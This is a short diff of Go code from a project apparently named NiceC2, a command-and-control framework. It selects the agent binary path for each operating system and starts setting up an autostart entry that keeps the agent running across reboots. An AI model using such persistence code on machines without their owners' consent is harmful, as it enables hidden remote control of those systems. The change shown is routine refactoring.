@@ -21,19 +21,22 @@ func main() {
 
 	// Get the users home directory
 	home, _ := os.UserHomeDir()
-	testFile := filepath.Join(home, "Github", "NiceC2", "Agent", "agent.exe")
+	//testFile := filepath.Join(home, "GitHub", "NiceC2", "Agent", "agent") //Moved for cross compatability while testing
 
-	commandString := testFile
-
-	fmt.Println(commandString)
+	var testFile string = ""
 
 	// Selecting which shell to use
 	var shell string
 	if runtime.GOOS == "windows" {
 		shell = "powershell.exe"
+		testFile = filepath.Join(home, "GitHub", "NiceC2", "Agent", "agent.exe")
 	} else {
 		shell = "sh"
+		testFile = filepath.Join(home, "GitHub", "NiceC2", "Agent", "agent")
 	}
+
+	commandString := testFile
+	fmt.Println(commandString)
 
 	app := &autostart.App{
 		Name:        "NiceC2",
